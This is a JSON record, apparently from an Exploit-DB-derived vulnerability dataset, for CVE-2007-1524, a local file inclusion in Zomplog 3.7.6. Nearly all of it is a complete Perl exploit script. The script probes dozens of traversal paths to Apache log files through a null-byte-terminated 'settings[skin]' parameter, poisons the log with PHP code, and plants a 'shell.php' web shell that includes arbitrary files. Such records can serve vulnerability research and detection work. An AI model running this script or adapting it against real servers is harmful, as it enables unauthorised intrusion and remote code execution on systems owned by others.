{
  "id": "3476",
  "title": "Zomplog 3.7.6 (Windows x86) - Local File Inclusion",
  "cve": "CVE-2007-1524",
  "vuln_type": "path_traversal",
  "code": "#Made by Bl0od3r\r\n#tech-bl0od3r.blogspot.com\r\n\r\nuse IO::Socket;\r\nuse Switch;\r\n{\r\n$port = \"80\"; #\r\n$target = @ARGV[0]; # \r\n$folder = @ARGV[1]; # \r\n@paths=(\r\n\"../../../../../var/log/httpd/access_log\",\r\n\"../../../../../var/log/httpd/error_log\",\r\n\"../apache/logs/error.log\",\r\n\"../apache/logs/access.log\",\r\n\"../../apache/logs/error.log\",\r\n\"../../apache/logs/access.log\",\r\n\"../../../apache/logs/error.log\",\r\n\"../../../apache/logs/access.log\",\r\n\"../../../../apache/logs/error.log\",\r\n\"../../../../apache/logs/access.log\",\r\n\"../../../../../apache/logs/error.log\",\r\n\"../../../../../apache/logs/access.log\",\r\n\"../logs/error.log\",\r\n\"../logs/access.log\",\r\n\"../../logs/error.log\",\r\n\"../../logs/access.log\",\r\n\"../../../logs/error.log\",\r\n\"../../../logs/access.log\",\r\n\"../../../../logs/error.log\",\r\n\"../../../../logs/access.log\",\r\n\"../../../../../logs/error.log\",\r\n\"../../../../../logs/access.log\",\r\n\"../../../../../etc/httpd/logs/access_log\",\r\n\"../../../../../etc/httpd/logs/access.log\",\r\n\"../../../../../etc/httpd/logs/error_log\",\r\n\"../../../../../etc/httpd/logs/error.log\",\r\n\"../../../../../var/www/logs/access_log\",\r\n\"../../../../../var/www/logs/access.log\",\r\n\"../../../../../usr/local/apache/logs/access_log\",\r\n\"../../../../../usr/local/apache/logs/access.log\",\r\n\"../../../../../var/log/apache/access_log\",\r\n\"../../../../../var/log/apache/access.log\",\r\n\"../../../../../var/log/access_log\",\r\n\"../../../../../var/www/logs/error_log\",\r\n\"../../../../../var/www/logs/error.log\",\r\n\"../../../../../usr/local/apache/logs/error_log\",\r\n\"../../../../../usr/local/apache/logs/error.log\",\r\n\"../../../../../var/log/apache/error_log\",\r\n\"../../../../../var/log/apache/error.log\",\r\n\"../../../../../var/log/access_log\",\r\n\"../../../../../var/log/error_log\",\r\n\"../../../apache/logs/access.log\"\r\n);\r\n\r\n$sack_bad=IO::Socket::INET->new(Proto=>\"tcp\",PeerAddr=>$target,PeerPort=>$port) || die \"[Error while connecting]\\n\";\r\nprint $sack_bad \"GET /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA HTTP/1.1\\n\";\r\nprint $sack_bad \"Host: $target\\n\";\r\nprint $sack_bad \"Connection: close\\n\";\r\nclose($sack_bad);\r\n\r\n###################################################################################################################################\r\n\r\n$sack_good=IO::Socket::INET->new(Proto=>\"tcp\",PeerAddr=>$target,PeerPort=>$port) || die \"[Error while connecting]\\n\";\r\nprint $sack_good \"GET /index.php?&AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA HTTP/1.1\\n\";\r\nprint $sack_good \"Host: $target\\n\";\r\nprint $sack_good \"Connection: close\\n\";\r\nclose($sack_good);\r\n###################################################################################################################################\r\n\r\nprint \"[+]Fake paths created.\\n\";\r\n\r\nforeach $path (@paths)\r\n{\r\n        $sock = IO::Socket::INET->new(Proto => \"tcp\", PeerAddr => $target, PeerPort => $port) || die \"[Error while connecting]\\n\";\r\n        print $sock \"GET \".$folder.\"themes/default/?theme[options]=232222&settings[skin]=\".$path.\"%00 HTTP/1.1\\n\";\r\n        print $sock \"Host: $target\\n\";\r\n        print $sock \"Accept: text/html\\n\";\r\n        print $sock \"Connection: close\\n\\n\\r\\n\";\r\n        while ($answer = <$sock>) {\r\n$out.=$answer;\r\n }\r\n\r\n        if ($out =~ m/AAAAAAAAAAAAAAAAAAAAAAAAAAA/) {\r\nprint \"Found->[\".$path.\"]\";\r\n&code();\r\n}\r\n\r\n}\r\n\r\nsub code() {\r\n$code_sock=IO::Socket::INET->new(Proto=>\"tcp\",PeerAddr=>$target,PeerPort=>$port) || die \"[Error while connecting]\\n\";\r\nprint $code_sock \"GET /<?php \\$file=fopen('shell.php','w');fwrite(\\$file,'<?php include(\\$_GET[file]) ?>'); ?> HTTP/1.1\\n\";\r\nprint $code_sock \"Host: $target\\n\";\r\nprint $code_sock \"Connection: close\\n\\n\";\r\n\r\nprint \"\\n[+]Bad Code Injected\\n\";\r\n\r\n&cmd();\r\n}\r\n\r\nsub cmd() {\r\nprint \"[+]Successfully created:shell.php\\n\";\r\nexit;\r\n}\r\n}\r\n\r\n# milw0rm.com [2007-03-14]",
  "url": "https://www.exploit-db.com/exploits/3476"
}